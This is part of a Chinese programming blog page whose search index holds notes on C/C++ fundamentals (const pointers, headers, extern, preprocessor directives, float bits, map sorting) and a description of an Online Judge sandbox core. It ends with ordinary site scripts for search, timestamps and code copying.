&lt;h2 id=&#34;const-char-p-和-char-const-p-的区别&#34;&gt;const char *p 和 char * const p 的区别&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;const char *p; // 声明一个指向字符或字符串常量的指针(p所指向的内容不可修改)
char const *p;// 同上
char * const p;//声明一个指向字符或字符串的指针常量，即不可以修改p的值，也就是地址无法修改。
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;cin和cout&#34;&gt;cin和cout&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;cout &amp;lt;&amp;lt; &amp;quot;string...&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中cout是一个预定义在iostream中的对象，&amp;lt;&amp;lt;是运算符重载，表示插入运算符，将后面的字符插入到输出流当中。&lt;/p&gt;
&lt;p&gt;endl也是预定义在iostream中的。&lt;/p&gt;
&lt;p&gt;cin是istream类的一个对象，cout是ostream类的一个对象。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;extern istream cin;		/// Linked to standard input
extern ostream cout;		/// Linked to standard output

getline(cin, str); // getline不是一个类函数，将cin作为函数，表示从哪里去查找输入
cin.getline(char*, legth); // cin对象的getline函数没有处理string类的能力
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;函数原型和函数定义：&lt;/strong&gt;‘&lt;/p&gt;
&lt;p&gt;函数原型之于函数类似于变量声明之于变量，&lt;code&gt;double sqrt(double);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;函数原型只描述函数接口，包含参数和返回信息。&lt;/p&gt;
&lt;p&gt;函数定义包含了编译代码。&lt;/p&gt;
&lt;p&gt;库文件包含了函数编译代码，而头文件中则包含了原型。对于库函数，在使用之前需要提供其原型，通常把原型放到main()之前。&lt;/p&gt;
&lt;h2 id=&#34;h和c的区别&#34;&gt;.h和.c的区别&lt;/h2&gt;
&lt;p&gt;要理解.c文件与.h文件有什么不同之处，首先需要弄明白编译器的工作过程，一般说来编译器会做以下几个过程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;预处理阶段(#开头的语句是预处理指令，其实预编译操作就是简单的文本转换)&lt;/li&gt;
&lt;li&gt;词法与语法分析阶段&lt;/li&gt;
&lt;li&gt;编译阶段,首先编译成纯汇编语句,再将之汇编成跟CPU相关的二进制码，生成各个目标文件&lt;/li&gt;
&lt;li&gt;连接阶段，将各个目标文件中的各段代码进行绝对地址定位，生成跟特定平台相关的可执行文件，当然，最后还可以用objcopy生成纯二进制码，也就是去掉了文件格式信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一般.h文件是写一些常量、变量、函数以及类的&lt;strong&gt;声明&lt;/strong&gt;，而在.c/.cpp中对他们进行&lt;strong&gt;定义&lt;/strong&gt;，一般需要加上预编译语句：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#ifndef CIRCLE_H
#define CIRCLE_H

//你的代码

#endif
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;.c/.cpp文件主要写实现头文件中已经声明的那些函数的具体代码。需要注意的是，开头必须#include一下实现的头文件，以及要用到的头文件。&lt;/p&gt;
&lt;p&gt;.h文件叫作头文件，它是不能编译的，#include指令叫作预编译指令，可以理解成在真正编译前，把所有.h文件中的代码替换到头部。所以不建议在.h中声明变量，因为一个.h可能被多个.c文件引用，那么会出现重复定义。&lt;/p&gt;
&lt;p&gt;一般.h文件和.c/cpp文件的文件名一致，可以方便知道谁和谁是一个模块，当然一个.h和.c之间可以没有任何关系。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;从C编译器角度看，.h和.c皆是浮云，就是改名为.txt、.doc也没有大的分别。换句话说，就是.h和.c没啥必然联系。.h中一般放的是同名.c文件中定义的变量、数组、函数的声明，需要让.c外部使用的声明。这个声明有啥用？只是让需要用这些声明的地方方便引用。因为#include &amp;quot;xx.h&amp;quot; 这个宏其实际意思就是把当前这一行删掉，把xx.h 中的内容原封不动的插入在当前行的位置。由于想写这些函数声明的地方非常多（每一个调用xx.c 中函数的地方，都要在使用前声明一下子），所以用#include &amp;quot;xx.h&amp;quot; 这个宏就简化了许多行代码——让预处理器自己替换好了。也就是说，xx.h 其实只是让需要写xx.c 中函数声明的地方调用（可以少写几行字），至于include 这个.h 文件是谁，是.h 还是.c，还是与这个.h 同名的.c，都没有任何必然关系。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;extern关键字&#34;&gt;extern关键字&lt;/h2&gt;
&lt;p&gt;在一个.c文件中可以使用extern关键引用其它.c文件中&lt;strong&gt;声明&lt;/strong&gt;的的变量函数..&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;extern int a; // 声明一个全局变量 a
int a; // 定义一个全局变量 a
extern int a = 0; // 定义一个全局变量 a 并给初值
int a = 0; // 定义一个全局变量 a, 并给初值
第四个等于第三个，都是定义一个可以被外部使用的全局变量，并给初值。

定义只能出现在一处，不管是int a；还是extern int a=0；还是int a=0;都只能出现一次，而声明extern int a可以出现很多次。

当要引用一个全局变量时，必须要声明。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;有好的用法：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// a.c
#include&amp;lt;stdio.h&amp;gt;
int x = 5;
int fun(int a, int b)
{
    return a + b;
}

// a.h
extern int x;
extern int fun();

// b.c
#include&amp;lt;stdio.h&amp;gt;
#include &amp;quot;a.h&amp;quot;
int main()
{
    printf(&amp;quot;%d&amp;quot;, x);
    printf(&amp;quot;%d&amp;quot;, fun(1,2));
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;预编译指令&#34;&gt;预编译指令&lt;/h2&gt;
&lt;p&gt;预编译指令主要作用是通过内建功能堆一个资源进行等价替换，最常见的有：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;文件包含&lt;br&gt;
&lt;code&gt;#include&lt;/code&gt;主要是做为文件的引用组合源程序正文。&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;#include &lt;iostream&gt; //标准库头文件&lt;/li&gt;
&lt;li&gt;#include &amp;lt;iostream.h&amp;gt; //旧式的标准库头文件&lt;/li&gt;
&lt;li&gt;#include &amp;quot;io.h&amp;quot; //用户自定义的头文件，对于#include &amp;lt;io.h&amp;gt; ，编译器从标准库路径开始搜索，对于#include &amp;quot;io.h&amp;quot; ，编译器从用户的工作路径开始搜索&lt;/li&gt;
&lt;li&gt;#include &amp;quot;../file.h&amp;quot; //UNIX下的父目录下的头文件&lt;/li&gt;
&lt;li&gt;#include &amp;quot;/usr/local/file.h&amp;quot; //UNIX下的完整路径&lt;/li&gt;
&lt;li&gt;#include &amp;quot;..\file.h&amp;quot; //Dos下的父目录下的头文件&lt;/li&gt;
&lt;li&gt;#include &amp;quot;\usr\local\file.h&amp;quot; //Dos下的完整路径&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;条件编译&lt;br&gt;
&lt;code&gt;#if #ifndef #ifdef #endif #undef&lt;/code&gt;主要是进行编译时进行有选择的挑选，注释掉一些指定的代码，以达到版本控制、防止对文件重复包含的功能。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define            定义一个预处理宏
#undef            取消宏的定义

#if                   编译预处理中的条件命令，相当于C语法中的if语句
#ifdef              判断某个宏是否被定义，若已定义，执行随后的语句
#ifndef            与#ifdef相反，判断某个宏是否未被定义
#elif                若#if, #ifdef, #ifndef或前面的#elif条件不满足，则执行#elif之后的语句，相当于C语法中的else-if
#else              与#if, #ifdef, #ifndef对应, 若这些条件不满足，则执行#else之后的语句，相当于C语法中的else
#endif             #if, #ifdef, #ifndef这些条件命令的结束标志.
#defined         　与#if, #elif配合使用，判断某个宏是否被定义
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;布局控制&lt;br&gt;
&lt;code&gt;#progma&lt;/code&gt; 主要功能时为编译程序提供非常规的控制流信息。&lt;/li&gt;
&lt;li&gt;宏替换&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;浮点数的存储方式&#34;&gt;浮点数的存储方式&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1600483237666.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;decimaldecimal&#34;&gt;decimal.Decimal&lt;/h2&gt;
&lt;p&gt;python中的decimal.Decimal类型可以非常精确地存储在计算机中，其优于float类型。&lt;br&gt;
用法：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from decimal import Decimal

# 字符串/浮点数转换为Decimal
Decimal(&#39;1.11&#39;)
# &amp;gt;&amp;gt;Decimal(&#39;1.11&#39;)
Decimal(1.11)
# &amp;gt;&amp;gt;Decimal(&#39;1.1100000000000000976996261670137755572795867919921875&#39;)

# 四舍五入
Decimal(&#39;50.5679&#39;).quantize(Decimal(&#39;0.00&#39;))
# &amp;gt;&amp;gt;Decimal(&#39;50.57&#39;)

# Decimal 结果转化为string
str(Decimal(&#39;3.40&#39;).quantize(Decimal(&#39;0.0&#39;)))
# &amp;gt;&amp;gt;&#39;3.4&#39;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将浮点数以二进制输出：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;

int main(void)
{
	float fnum = 1;
	int i;
	int * p = (int *)&amp;amp;fnum;//定义一个指向fnum的指针
        int x=0;//设置flag变量
	while (fnum != 0)//以0作为输入结束标志
	{
		printf(&amp;quot;input a num: &amp;quot;);
		x=scanf(&amp;quot;%f&amp;quot;, &amp;amp;fnum);
                if(!x)//判断是否输入成功
                {
                       printf(&amp;quot;wrong\n&amp;quot;);
                       fflush(stdin);//清空输入流，不然会死循环
                       continue;
                }
		for (i = 31; i &amp;gt;= 0; i--)
		{
                      /*将1左移i位，通过与运算判断第i位是否为1*/
                      printf(&amp;quot;%d&amp;quot;, (*p &amp;amp; (1 &amp;lt;&amp;lt; i) ? 1: 0));
                      /*控制空格输入*/
                      if(i==31||i==23)
                           printf(&amp;quot;  &amp;quot;);
                      if(i==27||i==19||i==15||i==11||i==7||i==3)
                           printf(&amp;quot; &amp;quot;);
		}
		printf(&amp;quot;\n&amp;quot;);
	}
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;实现按照map的value排序&#34;&gt;实现按照map的value排序&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;//功能：输入单词，统计单词出现次数并按照单词出现次数从多到少排序  
#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstdlib&amp;gt;  
#include &amp;lt;map&amp;gt;  
#include &amp;lt;vector&amp;gt;  
#include &amp;lt;string&amp;gt;  
#include &amp;lt;algorithm&amp;gt;  

using namespace std;
   
int cmp(const pair&amp;lt;string, int&amp;gt;&amp;amp; x, const pair&amp;lt;string, int&amp;gt;&amp;amp; y)  
{  
    return x.second &amp;gt; y.second;  
}  
   
void sortMapByValue(map&amp;lt;string, int&amp;gt;&amp;amp; tMap,vector&amp;lt;pair&amp;lt;string, int&amp;gt; &amp;gt;&amp;amp; tVector)  
{  
    for (map&amp;lt;string, int&amp;gt;::iterator curr = tMap.begin(); curr != tMap.end(); curr++)   
        tVector.push_back(make_pair(curr-&amp;gt;first, curr-&amp;gt;second));    
   
    sort(tVector.begin(), tVector.end(), cmp);  
}  
int main()  
{  
    map&amp;lt;string, int&amp;gt; tMap;  
    string word;  
    while (cin &amp;gt;&amp;gt; word)  
    {  
        pair&amp;lt;map&amp;lt;string,int&amp;gt;::iterator,bool&amp;gt; ret = tMap.insert(make_pair(word, 1));  
        if (!ret.second)  
            ++ret.first-&amp;gt;second;  
    }   
   
    vector&amp;lt;pair&amp;lt;string,int&amp;gt;&amp;gt; tVector;  
    sortMapByValue(tMap,tVector);  
    for(int i=0;i&amp;lt;tVector.size();i++)  
        cout&amp;lt;&amp;lt;tVector[i].first&amp;lt;&amp;lt;&amp;quot;: &amp;quot;&amp;lt;&amp;lt;tVector[i].second&amp;lt;&amp;lt;endl;  
   
    system(&amp;quot;pause&amp;quot;);  
    return 0;  
} 
&lt;/code&gt;&lt;/pre&gt;
">【C++】常见问题</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/oj-pan-ti-he-xin/"" data-c="
          &lt;h2 id=&#34;1-online-judge-判题核心&#34;&gt;1 Online Judge 判题核心&lt;/h2&gt;
&lt;p&gt;判题核心程序通过构建一个沙盒，运行用户提交的代码， 利用ptrace跟踪，限制用户代码的行为和资源消耗。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;core.h&lt;/code&gt;文件中是一些常量和全局变量的定义&lt;/p&gt;
&lt;p&gt;&lt;code&gt;core.cpp&lt;/code&gt;是主程序文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;logger.h&lt;/code&gt;是一个简易的日志程序&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rf_table.h&lt;/code&gt;是一个限制系统调用的表&lt;/p&gt;
&lt;p&gt;判题核心通过传入命令行参数获知输入，结果输出到文件， 所以不具有线程安全性。&lt;/p&gt;
&lt;h2 id=&#34;2-参数&#34;&gt;2 参数&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;-c&lt;/code&gt; 源代码路径&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-t&lt;/code&gt; 时间限制，可选，默认1000 MS&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-m&lt;/code&gt; 内存限制，可选，默认65535 KB&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-s&lt;/code&gt; 表示是否是special judge&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-S&lt;/code&gt; special judge程序的语言，1是C，2是C++，3是Java&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-d&lt;/code&gt; 表示运行的文件夹&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo ./Core -c ./test/test.c -t 1000 -m 65535 -s -S 2 -d ./test/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面表明，用户提交的代码是&lt;code&gt;./test/test.c&lt;/code&gt;，时限1000 ms，内存限制65535 KB， 需要SpecialJudge，SpecialJudge程序的语言是C++，运行的文件夹在&lt;code&gt;./test/&lt;/code&gt;下。&lt;/p&gt;
&lt;h2 id=&#34;3-程序编译&#34;&gt;3 程序编译&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;g++ core.cpp -o Core -O2
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;4-约定&#34;&gt;4 约定&lt;/h2&gt;
&lt;p&gt;构建的沙盒在&lt;code&gt;./test/&lt;/code&gt;文件夹下&lt;/p&gt;
&lt;p&gt;其中c语言程序是xxx.c，C++ 程序是xxx.cpp，Java程序是Main.java&lt;/p&gt;
&lt;p&gt;标准输入文件是&lt;code&gt;in.in&lt;/code&gt;，标准输出文件是&lt;code&gt;out.out&lt;/code&gt;，程序运行返回的结果是&lt;code&gt;result.txt&lt;/code&gt;文件&lt;/p&gt;
&lt;h2 id=&#34;5-specialjudge&#34;&gt;5 SpecialJudge&lt;/h2&gt;
&lt;p&gt;SpecialJudge程序是一个已经编译好的程序，名字叫&lt;code&gt;SpecialJudge&lt;/code&gt;。运行结束后请自行清理&lt;code&gt;./test/&lt;/code&gt;文件夹下的各种文件&lt;/p&gt;
&lt;p&gt;SpecialJudge 程序编写标准与&lt;a href=&#34;https://github.com/quark-zju/ljudge&#34;&gt;ljudge&lt;/a&gt;兼容&lt;/p&gt;
&lt;p&gt;SpecialJudge 程序的标准流（stdin）是题目的输入数据，同时Special程序还可以打开以下几个文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;input&amp;quot;&lt;/code&gt;：输入数据（也可直接由stdin读入）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;output&amp;quot;&lt;/code&gt;：输出数据&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;user_output&amp;quot;&lt;/code&gt; (或者argv[1]): 用户程序给出的输出&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;user_code&amp;quot;&lt;/code&gt; : 用户的程序代码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SpecialJudge 程序需要使用 exitcode 返回评测结果，0 代表 Accepted， 1 代表Wrong Answer， 2 代表Presentation Error&lt;/p&gt;
&lt;p&gt;下面是一个SpecialJudge 程序的样例，检测T个Case中用户输入的两个数是的是否等于标准输出&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;fstream&amp;gt;
using namespace std;
const int res_ac = 0;
const int res_wa = 1;
const int res_pe = 2;
int T;
int main()
{
	ifstream input(&amp;quot;input&amp;quot;, ios::in);
	ifstream output(&amp;quot;output&amp;quot;, ios::in);
	ifstream user_output(&amp;quot;user_output&amp;quot;, ios::in);
	ifstream user_code(&amp;quot;user_code&amp;quot;, ios::in);
	int user_ans = 0;
	bool flag = true;
	input &amp;gt;&amp;gt; T;
	while (T--)
	{
		int a, b, c;
		user_output &amp;gt;&amp;gt; a &amp;gt;&amp;gt; b;
		output &amp;gt;&amp;gt; c;
		flag &amp;amp;= (a + b == c);
	}
	if (flag) return res_ac;
	else return res_wa;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;6-resulttxt&#34;&gt;6 result.txt&lt;/h2&gt;
&lt;p&gt;返回结果格式：&lt;/p&gt;
&lt;p&gt;第一行：结果，&lt;code&gt;Compile Error&lt;/code&gt;等&lt;/p&gt;
&lt;p&gt;第二行：运行时间，不带单位，默认毫秒&lt;/p&gt;
&lt;p&gt;第三行：内存消耗，不带单位，默认KB&lt;/p&gt;
&lt;p&gt;接下来所有行：额外信息，一般情况下为空，当&lt;code&gt;Compile Error&lt;/code&gt;时，编译错误信息存在这里&lt;/p&gt;
&lt;h2 id=&#34;7-re&#34;&gt;7 RE&lt;/h2&gt;
&lt;p&gt;https://github.com/NJUST-FishTeam/OnlineJudgeCore&lt;/p&gt;
">OJ 判题核心</a>
      </div>
      
    </div>
    <div class="page">
      <div id="page_ul"></div>
    </div>
  </div>
</div>
<script>
  !function () {
    let searchMask = document.querySelector('#search_mask');
    let result = document.querySelector('#result');
    let items = document.querySelectorAll('.item');
    let searchBox = document.querySelector('#search');
    let statCount = document.querySelector('#stat_count');
    let statTimes = document.querySelector('#stat_times');
    let pageUl = document.querySelector('#page_ul');
    let close = document.querySelector('#close');
    
    close.addEventListener('click', function() {
      searchMask.style = 'display: none;'
    })

    let finds = [];
    let contents = [];
    let pageSize = 10;
    items.forEach(item => {
      let a = item.querySelector('a');
      contents.push({
        title: a.innerText,
        details: a.dataset.c,
        link: a.href
      })
      item.remove();
    })

    function insertStr(soure, start, count) {
      let newStr = soure.substr(start, count);
      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
    }

    pageUl.addEventListener('click', function(event) {
      let target = event.target;
      if (target.__proto__ === HTMLSpanElement.prototype) {
        appendResults(parseInt(target.dataset.i));
      }
    })

    function appendResults(index) {
      let htmlResult = '';
      let start = index || 0;
      let end = Math.min(start + pageSize, finds.length);
      for (let i = start; i < end; i++) {
        const current = finds[i];
        let html = current.title;
        let sum = 0;
        let positions = current.positions;
        positions.forEach(position => {
          html = insertStr(html, position.start + sum, position.count);
          sum += 9;
        })
        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
      }
      result.innerHTML = htmlResult;
      pageUl.innerHTML = '';
      let count = finds.length / pageSize;
      let lis = '';
      if (start !== 0) {
        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
      }
      for (let i = 0; i < count; i++) {
        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
      }
      if (start+1 < count) {
        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
      }
      pageUl.innerHTML = lis;
    }

    function search(delay) {
      let timer = null
      return function () {
        clearTimeout(timer)
        timer = setTimeout(() => {
          let start = Date.now();
          let segments = searchBox.value.split(' ').filter(c => c != '');
          if (segments.length <= 0) {
            return;
          }
          finds = [];
          let htmlResult = '';
          contents.forEach(content => {
            let title = content.title;
            let positions = [];
            let find = false;
            segments.forEach((segment) => {
              if (content.title.includes(segment)) {
                find = true;
                positions.push({
                  start: content.title.indexOf(segment),
                  count: segment.length
                })
              } else if (content.details.includes(segment)) {
                find = true;
              }
            });
            if (find) {
              finds.push({
                title: content.title,
                link: content.link,
                positions
              });
            }
          })
          appendResults(0);
          statCount.textContent = finds.length;
          statTimes.textContent = Date.now() - start;
        }, delay)
      }
    }
    searchBox.addEventListener('input', search(200));
  }()
</script>

<input hidden id="copy" />
<script>
  !function () {
    let times = document.querySelectorAll('.publish-time');
    for (let i = 0; i < times.length; i++) {
      let date = times[i].dataset.t;
      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
      if (time < 60) {
        str = time + '秒之前';
      } else if (time < 3600) {
        str = Math.floor(time / 60) + '分钟之前';
      } else if (time >= 3600 && time < 86400) {
        str = Math.floor(time / 3600) + '小时之前';
      } else if (time >= 86400 && time < 259200) {
        str = Math.floor(time / 86400) + '天之前';
      } else {
        str = times[i].textContent;
      }
      times[i].textContent = str;
    }
  }();
</script>

<script>
  let language = '';
  if (language !== '') {
    let map = new Map();
    if (language === 'en') {
      map.set('search', 'Search');
      map.set('category', 'Categories');
      map.set('article', 'Articles');
      map.set('tag', 'Tags');
      map.set('top', 'Top');
      map.set('publish', 'published');
      map.set('minute', ' minutes');
      map.set('read-more', 'Read More');
      map.set('view', 'View');
      map.set('words', ' words');
      map.set('category-in', 'category in');
      map.set('preview', 'Meta');
      map.set('index', 'Toc');
      map.set('no-archives', "You haven't created yet");
      map.set('archives', " articles in total");
      map.set('cloud-tags', " tags in total");
      map.set('copyright', "Copyright: ");
      map.set('author', "Author: ");
      map.set('link', "Link: ");
      map.set('leave-message', "Leave a message");
      map.set('format', "Links Format");
      map.set('site-name', "Name: ");
      map.set('site-link', "Link: ");
      map.set('site-desc', "Desc: ");
      map.set('stat', " related results, taking ");
      map.set('stat-time', " ms");
      map.set('site-img', "Image: ");
    }

    if (map.size > 0) {
      let lanElems = document.querySelectorAll('.language');
      lanElems.forEach(elem => {
        let lan = elem.dataset.lan, text = map.get(lan);
        if (elem.__proto__ === HTMLInputElement.prototype) {
          elem.placeholder = text
        } else {
          if (elem.dataset.count) {
            text = elem.dataset.count + text;
          }
          elem.textContent = text;
        }
      })
    }
  }
  //拿来主义(真香)^_^，Clipboard 实现摘自掘金 https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // 判断是不是ios端
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //创建文本元素
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //选择内容
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //复制到剪贴板
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("复制错误！请手动复制！")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === '复制成功') {
        return;
      }
      e.srcElement.textContent = '复制成功';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === '复制成功') {
            elem.textContent = '复制代码'
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = '复制代码';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })

</script>
<script src="/media/js/motion.js"></script>

<script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
<script>
  var scroll = new SmoothScroll('a[href*="#"]', {
    speed: 200
  });
</script>





</html>